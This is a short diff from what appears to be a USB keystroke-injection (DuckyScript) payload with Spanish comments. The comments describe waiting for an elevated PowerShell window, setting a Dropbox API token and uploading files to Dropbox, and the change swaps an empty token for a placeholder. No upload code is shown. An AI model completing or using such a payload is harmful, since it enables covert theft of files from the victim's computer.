@@ -23,7 +23,7 @@ REM Espera a que la ventana de PowerShell con permisos elevados esté lista
 DELAY 1000
 
 REM Establecer el token de API de Dropbox
-STRING $db = "";
+STRING $db = "YOUR_DROPBOX_ACCESS_TOKEN";
 ENTER
 
 REM Función para subir un archivo a Dropbox
